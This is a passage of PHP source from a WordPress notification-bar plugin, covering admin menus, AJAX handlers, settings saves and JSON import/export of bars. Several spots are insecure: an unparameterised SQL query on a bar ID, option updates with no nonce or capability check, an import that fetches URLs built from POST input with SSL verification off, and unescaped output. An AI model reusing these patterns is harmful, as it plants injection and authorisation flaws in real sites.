            $wooenabled = "false";
        }  
        $edn_pro_script_variable = array(
            'success_note' => $success,
            'but_email_error_msg' => $but_email_error_message,
            'already_subs' => $but_already_subs,
            'sending_fail' =>  $but_sending_fail,
            'check_to_conform' => $but_check_to_conform,
            'mailchimp_thank_text' => $thank_txt,
            'mailchimp_email_error_msg' => $mailchimp_email_error_msg,
            'mailchimp_check_to_conform' => $mailchimp_check_to_conform,
            'mailchimp_sending_fail' =>  $mailchimp_sending_fail,
            'iswooenabled'              => $wooenabled,
            'ajax_url' => admin_url() . 'admin-ajax.php',
            'ajax_nonce' => wp_create_nonce('edn-front-ajax-nonce'));

        /* Css  Style */
        wp_enqueue_style('apexnb-font-awesome',APEXNB_CSS_DIR.'/font-awesome/font-awesome.css',APEXNB_VERSION);
        wp_enqueue_style('apexnb-frontend-style', APEXNB_CSS_DIR . '/frontend/frontend.css',APEXNB_VERSION);
        wp_enqueue_style('apexnb-responsive-stylesheet', APEXNB_CSS_DIR . '/frontend/responsive.css',APEXNB_VERSION);
        wp_enqueue_style('apexnb-frontend-bxslider-style', APEXNB_CSS_DIR . '/frontend/jquery.bxslider.css',APEXNB_VERSION);
        wp_enqueue_style('apexnb-google-fonts-style', add_query_arg($this->edn_pro_font_re_form(), "//fonts.googleapis.com/css"));
        wp_enqueue_style('apexnb-mCustomScrollbar',APEXNB_CSS_DIR.'/frontend/jquery.mCustomScrollbar.css');
        wp_enqueue_style('apexnb-lightbox-style',APEXNB_CSS_DIR.'/frontend/prettyPhoto.css',false,APEXNB_VERSION);
        /* JS Script */ 
        wp_enqueue_script('apexnb-frontend-bxslider-js',APEXNB_JS_DIR.'/frontend/jquery.bxSlider.js',array('jquery'),APEXNB_BXSLIDER_VERSION);
        wp_enqueue_script('apexnb-mCustomScrollbarjs',APEXNB_JS_DIR.'/frontend/jquery.mCustomScrollbar.concat.min.js',array('jquery'),APEXNB_VERSION);
        /* JS For Countdown timer */
        wp_enqueue_style('apexnb_timecircles_style',APEXNB_CSS_DIR.'/frontend/TimeCircles.css');
        wp_enqueue_script('apexnb_timecircles_script',APEXNB_JS_DIR.'/frontend/TimeCircles.js',array('jquery'),APEXNB_VERSION);
        wp_enqueue_script('apexnb_downcount_script',APEXNB_JS_DIR.'/frontend/jquery.downCount.js',array('jquery'),APEXNB_VERSION);
           //pretty photo js 
        wp_enqueue_script('apexnb-lightbox-script',APEXNB_JS_DIR.'/frontend/jquery.prettyPhoto.js',array('jquery'),APEXNB_VERSION);
           //same for ticker
        wp_enqueue_style('apexnb-frontend-scroller-style', APEXNB_CSS_DIR . '/frontend/scroll-style.css');
        wp_enqueue_script('apexnb-frontend-scroller-js',APEXNB_JS_DIR.'/frontend/jquery.scroller.js',array('jquery'),'2');
        wp_enqueue_script( 'apexnb-actual_scripts', APEXNB_JS_DIR . '/frontend/jquery.actual.js',array('jquery') , APEXNB_VERSION );
        wp_enqueue_script('apexnb-frontend-js',APEXNB_JS_DIR.'/frontend/frontend.js',array('jquery'),APEXNB_VERSION);
            wp_localize_script( 'apexnb-frontend-js', 'edn_pro_script_variable', $edn_pro_script_variable ); //localization of php variable in edn-pro-frontend-js
        }

        /**
         * Query WooCommerce activation check
        */
        public static function is_woocommerce_activated() {
          return class_exists( 'woocommerce' ) ? true : false;
      }

         /**
          * remove space of google font for enque
          * */
         function edn_pro_font_re_form()
         {

            $fonts = "Roboto";
            $fonts_final = str_replace(' ', '+', $fonts);
            $query_args = array(
               'family' => $fonts_final,
               );
            return $query_args;
        }
        

         /**
          * lists the available icons
          * */
         function edn_pro_icon_list_action() 
         {
            if (wp_verify_nonce($_POST['_wpnonce'], 'edn-ajax-nonce')) {
                $plugin_path = plugin_dir_path(__FILE__);
                for ($i = 1; $i <= 12; $i++) {
                    $icon_set_image_array = array();
                    ?>
                    <div class="edn-set-wrapper" id="edn-set-<?php echo $i; ?>">
                        <h3>Set <?php echo $i; ?></h3>
                        <div class="edn-row">
                            <?php
                            $handle = opendir(dirname(realpath(__FILE__)) . '/images/icon-sets/png/set' . $i);
                            while ($file = readdir($handle)) {
                                $filename_array = explode('.', $file);
                                $filename = ucfirst($filename_array[0]);
                                $ext = end($filename_array);
                                if ($file !== '.' && $file !== '..' && $ext == 'png') {
                                    $icon_set_image_array[] = $file;
                                }//if close
                            }//while close
                            if (count($icon_set_image_array) > 0) {
                                natsort($icon_set_image_array);
                                foreach ($icon_set_image_array as $file) {
                                    $filename_array = explode('.', $file);
                                    $filename = ucfirst($filename_array[0]);
                                    ?>
                                    <div class="edn-col-one-fourth">
                                        <div class="edn-set-image-wrapper">
                                            <a href='javascript:void(0);'>
                                                <img src="<?php echo APEXNB_ICONS_DIR . '/png/set' . $i . '/' . $file; ?>" alt="<?php echo $filename; ?>" title="<?php echo $filename; ?>"/>
                                                <span class="edn-set-image-title"><?php echo $filename; ?></span>
                                            </a>
                                        </div>
                                    </div>
                                    <?php
                                }
                            }

                            ?>
                        </div>
                    </div><!--edn-set-wrapper-->
                    <div class="clear"></div>
                    <?php
                }
                die();
            } else {
                die('No script kiddies please!');
            }
        } 
        
        /**
         * Plugin Menu Registration
         * */

        function edn_pro_menu(){

            add_menu_page( __(APEXNB_TITLE,APEXNB_TD), __('Apex Notification Bar ',APEXNB_TD),'manage_options',APEXNB_TD, array($this, 'main_page'),'dashicons-microphone' );//, EDN_IMAGE_DIR.'/edn_notify_icon.png' );
            add_submenu_page(APEXNB_TD, __(APEXNB_TITLE,APEXNB_TD), __('Apex Notification Bar',APEXNB_TD), 'manage_options', APEXNB_TD, array($this, 'main_page'));    
            add_submenu_page(APEXNB_TD, __('Add New Bar',APEXNB_TD), __('Add New Bar',APEXNB_TD), 'manage_options', 'apexnb-add-bar', array($this, 'add_new_bar'));
            add_submenu_page(APEXNB_TD, __('Notification Settings',APEXNB_TD), __('Notification Settings',APEXNB_TD), 'manage_options', 'apexnb-settings', array($this, 'settings_page'));
            add_submenu_page(APEXNB_TD, __('Constant Contact API Settings',APEXNB_TD), __('Constant Contact API Settings',APEXNB_TD), 'manage_options', 'apexnb-constant_contact', array($this, 'connect_constant_contact'));
            add_submenu_page(APEXNB_TD, __('Opt-In Settings',APEXNB_TD), __('Opt-In Settings',APEXNB_TD), 'manage_options', 'apexnb-opt-subscribers-list', array($this, 'list_subscibers'));
            add_submenu_page(APEXNB_TD, __('How to use',APEXNB_TD), __('How to use',APEXNB_TD), 'manage_options', 'apexnb-how-to-use', array($this, 'how_to_use'));
            add_submenu_page(APEXNB_TD, __('More WordPress Stuff',APEXNB_TD), __('More WordPress Stuff',APEXNB_TD), 'manage_options', 'apexnb-about', array($this, 'about'));
        }


          /**
          * Plugin Constant contact form settings
          */
          function connect_constant_contact() {
            include_once(APEXNB_PRO_PATH.'inc/backend/main_setup/constant_contact_setup.php');
        }
        

         /**
          * plugin's main page
          * */
         function main_page() {
            $opts = apexnb_ednmc_get_options( 'form' );

            $connected = ( apexnb_edn_get_api()->is_connected() );
            // $force_cache_refresh = isset( $_POST['edn-renew-cache'] ) && $_POST['edn-renew-cache'] == 1;
            $force_cache_refresh = (isset( $_SESSION['edn_renew_mailchimp_cache'] ) && $_SESSION['edn_renew_mailchimp_cache'] == 1)?'true':'';
            $lists = $this->mailchimp->get_lists( $force_cache_refresh );
            if ( $force_cache_refresh ) {

            	if( is_array( $lists ) ) {
            		if( count( $lists ) === 100 ) {
            			add_settings_error( 'mcedn', 'mcedn-lists-at-limit', __( 'The plugin can only fetch a maximum of 100 lists from MailChimp, only your first 100 lists are shown.', APEXNB_TD ) );
            		} else {
            			add_settings_error( 'mcedn', 'mcedn-cache-success', __( 'Renewed MailChimp cache.', APEXNB_TD ), 'updated' );
            		}
            	} else {
            		add_settings_error( 'mcedn', 'mcedn-cache-error', __( 'Failed to renew MailChimp cache - please try again later.', APEXNB_TD ) );
            	}

            }
            include_once(APEXNB_PRO_PATH.'inc/backend/notify_bar_setup/main-page.php');
        }

         /**
          * plugin's Settings page
          * */
         function settings_page() {
            /**
            * Mailchimp Subscribe List Settings with renew cache
            */
            $connected = (apexnb_edn_get_api()->is_connected());
            $ednlists = $this->mailchimp->get_lists();
            include_once(APEXNB_PRO_PATH.'inc/backend/main_setup/settings-page.php');
        }

        function list_subscibers(){
            include_once(APEXNB_PRO_PATH.'inc/backend/main_setup/lists-subscribers.php');
        }


         /**
          * Add new notification bar
          * */
         function add_new_bar() {
            /**
             * Gets the MailChimp for WP API class and injects it with the given API key
             * @since 1.0
             * @return APEXNB_API
             */
            $opts = apexnb_ednmc_get_options( 'form' );
            // echo "<pre>"; print_r($opts);
            // print_r(apexnb_edn_get_api());
            $connected = ( apexnb_edn_get_api()->is_connected() );
            if($connected == 1){

                 //$force_cache_refresh = isset( $_POST['edn-renew-cache'] ) && $_POST['edn-renew-cache'] == true;
               $force_cache_refresh = (isset( $_SESSION['edn_renew_mailchimp_cache'] ) && $_SESSION['edn_renew_mailchimp_cache'] == 1)?'true':'';
               
               $lists = $this->mailchimp->get_lists($force_cache_refresh);
               
               if ( $force_cache_refresh ) {

                 if( is_array( $lists ) ) {
                    if( count( $lists ) === 100 ) {
                       add_settings_error( 'mcedn', 'mcedn-lists-at-limit', __( 'The plugin can only fetch a maximum of 100 lists from MailChimp, only your first 100 lists are shown.', APEXNB_TD ) );
                   } else {
                       add_settings_error( 'mcedn', 'mcedn-cache-success', __( 'Renewed MailChimp cache.', APEXNB_TD ), 'updated' );
                   }
               } else {
                add_settings_error( 'mcedn', 'mcedn-cache-error', __( 'Failed to renew MailChimp cache - please try again later.', APEXNB_TD ) );
            }

        }
    }else{
      $lists = array();
  }

            /* 
            *Constant Contact List Retrieve Method
            */
            
            $apexnb_constant_settings = $this->apexnb_constant_settings;
            $cc_username        = $apexnb_constant_settings['edn_cc_username'];
            $edn_cc_apikey      = $apexnb_constant_settings['edn_cc_apikey'];
            $edn_cc_accesstoken = $apexnb_constant_settings['edn_cc_accesstoken'];

            if( $cc_username != '' && $edn_cc_apikey != '' && $edn_cc_accesstoken != ''){
                $EDN_ConstantContact = new EDN_ConstantContact('oauth2', $edn_cc_apikey ,$cc_username, $edn_cc_accesstoken);
            //$EDN_ConstantContact = new EDN_ConstantContact('oauth2', 'adsadasd' ,'adasdsa', 'asdasds');
            // Get a page of ContactLists
                $constant_lists = $EDN_ConstantContact->getLists();
                if(isset($constant_lists['xml'])){
                  $string = $constant_lists['xml'];
                  $err_codes= array(
                    '401'
                    );
                  $check_error = 0;
                  foreach ($err_codes as $error_code) {
                      if (strpos($string, $error_code) !== FALSE) {
                      // echo "Match found";
                      // return $response;
                          $check_error = 1;
                      }
                  }
              }else{
                  $check_error = 0;
              }

              if($check_error != 1){
                  $cc_lists = $constant_lists;
              }else{
                  $cc_lists = $string;
              }
          }else{
            $constant_lists = array();

        }

        include_once(APEXNB_PRO_PATH.'inc/backend/notify_bar_setup/add-new-bar.php');
    }


         /**
          * about section
          * */
         function about() {
            include_once(APEXNB_PRO_PATH.'inc/backend/about.php');
        }

         /**
          * how to use section
          * */
         function how_to_use() {
            include_once(APEXNB_PRO_PATH.'inc/backend/how-to-use.php');
        }


         /**
          *  Saves notification bar to database
          **/
         function edn_pro_add_bar_action(){
            if(!empty($_POST) && wp_verify_nonce($_POST['edn_pro_add_nonce_field'],'edn-pro-add-nonce')){
                include_once(APEXNB_PRO_PATH.'inc/backend/save-edn-bar.php');
            }
            else{
                die('No script kiddies please!');
            }
        }

         /**
          *  Saves settings to database
          **/
         function edn_pro_settings_action(){
            if(!empty($_POST) && wp_verify_nonce($_POST['edn_pro_nonce_field'],'edn-pro-nonce')){
              if(isset($_POST['edn_renew_mailchimp'])){
                $ednrenewcache = $_POST['edn-renew-cache'];
                $_SESSION['edn_renew_mailchimp_cache'] =  $ednrenewcache;
                $_SESSION['edn-success-message'] = __('Renewed MailChimp cache.',APEXNB_TD);
                $ednlists = $this->mailchimp->get_lists( $ednrenewcache);
                wp_redirect(admin_url('admin.php?page=apexnb-settings'));
            }else if(isset($_POST['import_submit'])){
             if ( !empty( $_FILES ) && $_FILES['import_bar_file']['name'] != '' ) {
                $filename = $_FILES['import_bar_file']['name'];
                $filename_array = explode( '.', $filename );

                $filename_ext = end( $filename_array );
                if ( $filename_ext == 'json' ) {

                    $new_filename = 'apexnb-import-' . rand( 111111, 999999 ) . '.' . $filename_ext;
                    $upload_path = APEXNB_PRO_PATH . 'temp/' . $new_filename;
                    $source_path = $_FILES['import_bar_file']['tmp_name'];
                    $check = @move_uploaded_file( $source_path, $upload_path );

                    if ( $check ) {

                        $url = APEXNB_PRO_URL . 'temp/' . $new_filename;
                        $params = array(
                            'sslverify' => false,
                            'timeout' => 60
                            );
                        $connection = wp_remote_get( $url, $params );
                        if ( !is_wp_error( $connection ) ) {
                            $body = $connection['body'];

                            $theme_row = json_decode( $body );
                            unlink( $upload_path );
                            $check = APEXNB_Class::import_notifybar_theme( $theme_row );
                            if ( $check ) {
                                //$_SESSION['edn_settings_message'] = __( 'Notification Bar File imported successfully.', APEXNB_TD );
                                wp_redirect(admin_url('admin.php?page=apexnb-settings&message=2'));
                                exit;

                            } else {
                               // $_SESSION['edn_settings_error'] = __( 'Something went wrong. Please try again later.', APEXNB_TD );
                                wp_redirect(admin_url('admin.php?page=apexnb-settings&message=3'));
                                exit;
                            }
                        } else {
                            //$_SESSION['edn_settings_error'] = __( 'Something went wrong. Please try again.', APEXNB_TD );
                            wp_redirect(admin_url('admin.php?page=apexnb-settings&message=3'));
                            exit;
                        }
                    } else {
                       // $_SESSION['edn_settings_error'] = __( 'Something went wrong. Please check the write permission of temp folder inside the plugin\'s folder', APEXNB_TD );
                        wp_redirect(admin_url('admin.php?page=apexnb-settings&message=4'));
                        exit;
                    }
                } else {
                   // $_SESSION['edn_settings_error'] = __( 'Invalid File Extension', APEXNB_TD );
                    wp_redirect(admin_url('admin.php?page=apexnb-settings&message=5'));
                    exit;
                }
            }else if(!empty( $_POST['third-choice'] )){
                $first = $_POST['first-choice'];
                $second = $_POST['sec-choice'];
                $third = $_POST['third-choice'];
                $url = APEXNB_PRO_URL . 'demo/' .$first .'/'. $second.'/'.$third;
                $filename_array = explode( '.',  $url  );
                $filename_ext = $filename_array[1];

                if ( $filename_ext == 'json' ) {

                    $params = array(
                        'sslverify' => false,
                        'timeout' => 60
                        );
                    $connection = wp_remote_get( $url, $params );
                    if ( !is_wp_error( $connection ) ) {
                        $body = $connection['body'];

                        $theme_row = json_decode( $body );
                        $check = APEXNB_Class::import_notifybar_theme( $theme_row );
                        if ( $check ) {
                          //  $_SESSION['edn_settings_message'] = __( 'Notification Bar File imported successfully.', APEXNB_TD );
                            wp_redirect(admin_url('admin.php?page=apexnb-settings&message=2'));
                            exit;

                        } else {
                          //  $_SESSION['edn_settings_error'] = __( 'Something went wrong. Please try again later.', APEXNB_TD );
                            wp_redirect(admin_url('admin.php?page=apexnb-settings&message=3'));
                            exit;
                        }
                    } else {
                      //  $_SESSION['edn_settings_error'] = __( 'Something went wrong. Please try again.', APEXNB_TD );
                        wp_redirect(admin_url('admin.php?page=apexnb-settings&message=3'));
                        exit;
                    }
                } else {
                   // $_SESSION['edn_settings_error'] = __( 'Something went wrong. Please check the write permission of temp folder inside the plugin\'s folder', APEXNB_TD );
                    wp_redirect(admin_url('admin.php?page=apexnb-settings&message=4'));
                    exit;
                }
            }  else{
              //$_SESSION['edn_settings_error'] = __( 'No any file uploaded.', APEXNB_TD );
              wp_redirect(admin_url('admin.php?page=apexnb-settings&message=7'));
              exit;
          }

      }else if(isset($_POST['export_submit'])){
       $custom_bar_id = sanitize_text_field( $_POST['export_bar_id'] );

       if ( $custom_bar_id != '' ) {
          $bar_details = APEXNB_Class::get_bar_detail( $custom_bar_id );
          $filename = sanitize_title( $bar_details['edn_bar_name'] );
          $json = json_encode( $bar_details );

          header( 'Content-disposition: attachment; filename=' . $filename . '.json' );
          header( 'Content-type: application/json' );

          echo( $json);
      }else{
       wp_redirect(admin_url('admin.php?page=apexnb-settings'));
       exit;
   } 
}
else{
   include_once(APEXNB_PRO_PATH.'inc/backend/save-settings.php');
}
}
else{
    die('No script kiddies please!');
}
}


       /**
         * Custom Notification Bar Import
         */
       public static function import_notifybar_theme($theme_row) {
        $theme_row = ( array ) $theme_row;
        global $wpdb;

        $table_name = $wpdb->prefix . "apex_notification_bar";
        $edn_bar_name = $theme_row['edn_bar_name'];
        $edn_position = $theme_row['edn_position'];
        $edn_visibility = $theme_row['edn_visibility'];
        $edn_show_duration = $theme_row['edn_show_duration'];
        $edn_hide_duration = $theme_row['edn_hide_duration'];
        $edn_close_button = $theme_row['edn_close_button'];
        $edn_date = $theme_row['edn_date'];
        $edn_bar = $theme_row['edn_bar'];
        $nb_created_date = date( 'Y-m-d H:i:s:u' );
        $nb_modified = date( 'Y-m-d H:i:s:u' );
        $check = $wpdb->insert(
            $table_name , array(
                'edn_bar_name' => $edn_bar_name,
                'edn_position' => $edn_position,
                'edn_visibility' => $edn_visibility,
                'edn_show_duration' => $edn_show_duration,
                'edn_hide_duration' => $edn_hide_duration,
                'edn_close_button' => $edn_close_button,
                'edn_bar' => $edn_bar,
                'edn_date' => $edn_date,
                'nb_created' => $nb_created_date,
                'nb_modified' => $nb_modified
                ), array(
                '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s'
                )
                );

        return $check;
    }

        /**
         * Model to return form settings by form id
         */
        public static function get_bar_detail($id) {
            global $wpdb;
            $table_name = $wpdb->prefix . "apex_notification_bar";
            $bar_details = $wpdb->get_row( "SELECT * FROM $table_name WHERE nb_id = $id", ARRAY_A );
            return $bar_details;
        }

         /*
         * Saves Constant Contact settings to database
         */
         function edn_pro_constant_contactsettings_action(){
           if(!empty($_POST) && wp_verify_nonce($_POST['edn_pro_constant_nonce_field'],'edn-pro-constant-nonce')){
            include_once(APEXNB_PRO_PATH.'inc/backend/save-contact-settings.php');
        }
        else{
            die('No script kiddies please!');
        }
    }

         /**
          * Prints array in pre format
          * */   
         function edn_pro_print_array($array){
            echo "<pre>";
            print_r($array);
            echo "</pre>";
        }

        /**
         * Starts the session
         */
        function admin_session_init() {
         register_setting('edn_constantcontact_group','edn_mcc','edn_constantcontact_validate');

     }

         /**
         * Notification bar delete section
         */
         function edn_delete_action() {
            if (isset($_GET['action'], $_GET['_wpnonce']) && wp_verify_nonce($_GET['_wpnonce'], 'edn-delete-nonce')) {
                include_once(APEXNB_PRO_PATH.'inc/backend/notify_bar_setup/delete-notification-bar.php');
            } else {
                die('No script kiddies please!');
            }
        }

         /**
         * Notification bar copy section
         */
         function edn_copy_action() {
            if (isset($_GET['action'], $_GET['_wpnonce']) && wp_verify_nonce($_GET['_wpnonce'], 'edn-copy-nonce')) {
                include_once(APEXNB_PRO_PATH.'inc/backend/notify_bar_setup/copy-notification-bar.php');
            } else {
                die('No script kiddies please!');
            }
        }

         //returns the current page url
        function curPageURL() {
            $pageURL = 'http';
            if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') {
                $pageURL .= "s";
            }
            $pageURL .= "://";
            if ($_SERVER["SERVER_PORT"] != "80") {
                $pageURL .= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"];
            } else {
                $pageURL .= $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
            }
            return $pageURL;
        }

         /**
         * Notification bar edit action
         */
         function edn_edit_action() {

            if (isset($_POST['edn_edit_set_nonce'], $_POST['edit_settings_submit']) && wp_verify_nonce($_POST['edn_edit_set_nonce'], 'edn_edit_action')) {
                include_once(APEXNB_PRO_PATH.'inc/backend/save-edn-bar.php');
            } else {
                die('No script kiddies please!');
            }
        }
        /**
         * Restores the default 
         */
        function edn_pro_restore_default() {
            $nonce = $_REQUEST['_wpnonce'];
            if(!empty($_GET) && wp_verify_nonce( $nonce, 'edn-pro-restore-default-nonce' ))
            {
                $apexnb_settings = $this->get_default_settings();
                update_option('apexnb_settings', $apexnb_settings);
                $edn_api_key['edn_api_key'] = '';
                update_option('edn_api_key', $edn_api_key);
               // $_SESSION['edn_message'] = __('Default Settings Restored Successfully', APEXNB_TD);
                wp_redirect(admin_url() . 'admin.php?page=apexnb-add-bar&message=3');
            }
        }

        /**
         * Returns Default Settings
         */
        function get_default_settings() {
            $apexnb_settings = array(
                'edn_pro_optons'=>'',
                'edn_pro_mobile'  => '',
                'edn_default_bar'=>'',
                'edn_bottom_bar'=>'',
                'edn_left_bar'=>'',
                'edn_right_bar'=>'',
                'edn_notify_on_pages'=> 'all_pages',
                'edn_display_pagess'=> '',
                'edn_notification_font' => 'Roboto',
                'edn_font_size'  => 12,
                'edn_use_smtp' => '',
                'edn_smtp_host'=>'',
                'edn_smtp_port' =>'',
                'edn_smtp_auth'=>'',
                'edn_smtp_username'=>'',
                'edn_smtp_password'=>''
                );
            return $apexnb_settings;
        }
        
        /**
         * Get current pages  
         * */
        function get_bar_page_lists(){
            wp_reset_postdata();
            $pages = get_pages(array('posts_per_page'   => -1,'post_status' => 'publish'));
            $page_lists = array();
            if(count($pages) > 0){
                foreach($pages as $page) :
                    $page_lists[$page->ID] = $page->post_title;
                endforeach;
                return $page_lists;
            }
        }

        function get_bar_post_lists(){
            wp_reset_postdata();
            $pages = get_posts(array('posts_per_page'   => -1,'post_status' => 'publish'));
            $page_lists = array();
            if(count($pages) > 0){
                foreach($pages as $page) :
                    $page_lists[$page->ID] = $page->post_title;
                endforeach;
                return $page_lists;
            }
        }
             /**
           * get all notification bar data from table with pagination  
           * */
             function get_all_notification_bar_data1() {

                global $wpdb;
                $table_name = $wpdb->prefix . "apex_notification_bar";
                $query = "SELECT * FROM $table_name ORDER BY nb_id DESC";

                $total_query = "SELECT COUNT(1) FROM (${query}) AS combined_table";
                $total = $wpdb->get_var( $total_query );
                $items_per_page = 20;
                $page = isset( $_GET['cpage'] ) ? abs( (int) $_GET['cpage'] ) : 1;
                $offset = ( $page * $items_per_page ) - $items_per_page;
                $latestposts = $wpdb->get_results( $query . " LIMIT ${offset}, ${items_per_page}" );

                return $latestposts;
            }

         /*
         * Custom Pagination Function 
         */
         function edn_custom_pagination1() {
            global $wpdb;
            $table_name = $wpdb->prefix . "apex_notification_bar";
            $query = "SELECT * FROM $table_name ORDER BY nb_id DESC";

            $total_query = "SELECT COUNT(1) FROM (${query}) AS combined_table";
            $total = $wpdb->get_var( $total_query );
            $items_per_page = 20;
            $page = isset( $_GET['cpage'] ) ? abs( (int) $_GET['cpage'] ) : 1;

            echo paginate_links( array(
                'base' => add_query_arg( 'cpage', '%#%' ),
                'format' => '',
                                // 'prev_text' => __('&laquo;'),
                                // 'next_text' => __('&raquo;'),
                'prev_text'          => __( '« Previous', APEXNB_TD ),
                'next_text'          => __( 'Next »', APEXNB_TD ),
                'total' => ceil($total / $items_per_page),
                'current' => $page
                ));
        }

         /**
         * Get current posts  
         * */
         function settings_submit(){
            wp_reset_postdata();
            $posts = get_posts(array('posts_per_page'   => -1,'post_status' => 'publish'));
            $post_lists = array();
            if(count($posts) > 0){
                foreach($posts as $post) :
                    $post_lists[$post->ID] = $post->post_title;
                endforeach;
                return $post_lists;
            }
        }

         /**
         * Get current categories  
         * */
         function get_bar_category_lists(){
            wp_reset_postdata();
            $categories = get_categories(array('hide_empty' => 0));
            // print_r($categories);
            $category_lists = array();
            if(count($categories) > 0){
                foreach($categories as $category) :
                    $category_lists[$category->cat_ID] = $category->name;
                endforeach;
                return $category_lists;
            }
        }

         /**
         * Get current taxonomy  
         * */
         function get_bar_taxonomy_lists(){
            wp_reset_postdata();
            $args = array('public'   => true,'_builtin' => false); 
            $output = 'objects';  //or objects
            $operator = 'and';  //'and' or 'or'
            $taxonomies = get_taxonomies($args,$output,$operator);
            $taxanomy_lists = array();
            if(count($taxonomies) > 0){
              foreach($taxonomies as $taxonomy => $vlue) :
                   //  $taxanomy_lists[] = $vlue->labels->singular_name;
                 $taxanomy_lists[] = $taxonomy;
             endforeach;
             return $taxanomy_lists;
         }
     }

         /**
         * Get current post types  
         * */
         function get_bar_post_types(){
            wp_reset_postdata();
            $args = array('public'   => true,'_builtin' => false);
            $output = 'objects'; // names or objects, note names is the default
            $operator = 'and'; // 'and' or 'or'
            $post_types = get_post_types( $args, $output, $operator );
            $post_type_lists = array();
            if(count($post_types) > 0){
                foreach($post_types as $post_type) :
                    $post_type_lists[] = $post_type->labels->name;
                endforeach;
                return $post_type_lists;
            }
        }

         /**
          * lists the mailchimp subscriber.
          * */
         function ajax_mailchimp_callback(){

            $api_key = $_POST['api_key'];
            $edn_api_key = get_option('edn_api_key');
            $edn_api_key['edn_mailcimp_api'] = sanitize_text_field($api_key);
            update_option('edn_api_key', $edn_api_key);
            
            $connect = apexnb_edn_get_api()->is_connected();
            if(empty($connect)){
                settings_errors();
            }
            //  if($connect == 1){

            // }
            die($connect);
        }

          /*
          * Backend reset Button for show only once at once
          */
          function fn_ajax_reset_showonce_backend()
          {
              # code...
            $get_general_options = get_option('edn_general_options');
            if(!empty($get_general_options)){
                delete_option('edn_general_options');
                die('success');
            }else{
                die('Flag is already empty.No data to reset.');
            }

        }

        function searchForId($id, $userid, $array) {
            if(isset($array) && !empty($array)){
             foreach ($array as $key => $val) {

                 if ($val['nb_id'] === $id && $val['userid'] === $userid) {
                     return true;

                 }
             }
         }
         return false;
     }

          /*
          * Reset show only once button using ajax for all notification bar
          */
          function fn_ajax_reset_showonce()
          {
           $check_reset = $_POST['check_reset'];
           $loggedin_checker = $_POST['loggedin_checker'];
           $nb_id = $_POST['nb_id'];
           $nonce = $_POST['nonce'];
           $userid = $_POST['userid'];

           $edn_general_options = get_option('edn_general_options');
           if(empty($edn_general_options)){
              $edn_general_options = array();
          }

          if(!empty($_POST) && wp_verify_nonce( $nonce, 'edn-front-ajax-nonce' )){
            if($check_reset == 1 && $loggedin_checker  == 1 && $nb_id != '' && $userid != '0'){

                // $var = array_search($nb_id, array_column($edn_general_options, 'nb_id');  

                $checkexists = $this->searchForId($nb_id, $userid,$edn_general_options);

                if( $checkexists){
                   die('sory');
               }else{
                 $edn_options = 
                 array(
                     'nb_id' => $nb_id,
                     'userid' => sanitize_text_field($userid),
                     'flag' => 1

                     );
                        // 'value is not in multidim array';
                 array_push($edn_general_options, $edn_options);
                 update_option('edn_general_options', $edn_general_options);
                 die('success');

             }
         }

            // if((array_search($nb_id, array_column($edn_general_options, 'nb_id')) !== false) 
            //   && (array_search($userid, array_column($edn_general_options, 'userid')) !== false)) {  

            //         }
            //         else {

            //          $edn_options = 
            //              array(
            //                'nb_id' => $nb_id,
            //                'userid' => sanitize_text_field($userid),
            //                'flag' => 1

            //             );
            //             // 'value is not in multidim array';
            //               array_push($edn_general_options, $edn_options);
            //               update_option('edn_general_options', $edn_general_options);
            //                die('success');
            //         }


            //     }else{
            //         die('fail');
            //     }


     }

 }


           /**
          * lists the display title.
          * */
           function ajax_display_title_callback(){
            $filter_val = $_POST['filter_val'];
            if($filter_val=='all'){
                echo 'all';
            }else{
             $explode = explode('=',$filter_val);
             $category_type = $explode[0];
             $cat_slug      = $explode[1];
             if($category_type=='category'){       
                $query         = $this->edn_get_postsdata_by_category($cat_slug);

                $total_rows = $query->found_posts;
                    //initialize pagination class
                $pagConfig = array(
                    'baseURL'       => APEXNB_CLASS_DIR_PAGINATION.'edn_show_posts_by_category.php',
                    'cat_slug'      => $cat_slug,
                    'category_type' => $category_type,
                    'taxonomy'      => '',
                    'totalRows'     => $total_rows, 
                    'perPage'       => APEXNB_PAGE_LIMIT, 
                    'contentDiv'    =>'posts_content_category');
                $pagination         =  new ApexNb_Pagination($pagConfig);
                if($total_rows  > 0){ ?>
                <div id="posts_content_category">
                 <div class="multiselect edn-display-title" id="showpages">
                  <?php while ($query->have_posts()) : $query->the_post();
                  $posts_name = get_the_title();
                  $postsID =  get_the_ID(); 
                  ?>
                  <label><input type="checkbox" name="edn_nb-add-check[]" class="nb-add-check" 
                      value="<?php echo $postsID; ?>"
                      data-postname="<?php echo $posts_name;?>"/><?php echo $posts_name; ?></label>
                  <?php endwhile;
                  wp_reset_postdata(); ?>
              </div>
              <?php echo $pagination->createLinks(); ?>

          </div>

          <?php }else{
            _e('No any Posts of this category found.',APEXNB_TD);
        }
    }else if($category_type=='terms'){
        $taxonomy = $explode[1];
        $terms_slug = $explode[2];
        $postsPerPage = APEXNB_PAGE_LIMIT;
        $argss = array(
            'post_status'    => array( 'publish' ),
            'posts_per_page' =>  $postsPerPage,
            'tax_query' =>array(
                array(
                    'taxonomy' => $taxonomy,
                    'field' => 'slug',
                    'terms' =>  $terms_slug
                    ),
                )

            );
        $loop = new WP_Query($argss);
        $total_count = $loop->found_posts;
        $pagConfig1 = array(
            'baseURL'       => APEXNB_CLASS_DIR_PAGINATION.'edn_show_posts_by_category.php',
            'cat_slug'      => $explode[2],
            'category_type' => $category_type,
            'taxonomy'      => $explode[1],
            'totalRows'     => $total_count, 
            'perPage'       => APEXNB_PAGE_LIMIT,
            'contentDiv'    =>'posts_content_terms');
        $pagination1        =  new ApexNb_Pagination($pagConfig1);

        if($total_count  > 0){ ?>
        <div id="posts_content_terms">
         <div class="multiselect edn-display-title" id="showpages">
             <?php  while($loop->have_posts()):$loop->the_post();
             $posts_name = get_the_title();
             $postsID =  get_the_ID(); ?>
             <label>
                 <input type="checkbox" name="edn_nb-add-check[]" class="nb-add-check" value="<?php echo $postsID; ?>"
                 data-postname="<?php echo $posts_name;?>"/><?php echo $posts_name; ?>
             </label>
         <?php endwhile;
         wp_reset_postdata(); ?>
     </div>
     <?php echo $pagination1->createLinks(); ?>

 </div>
 <?php
}else{
    _e('No any Posts of this terms category found.',APEXNB_TD);
}

}

}
die();
}

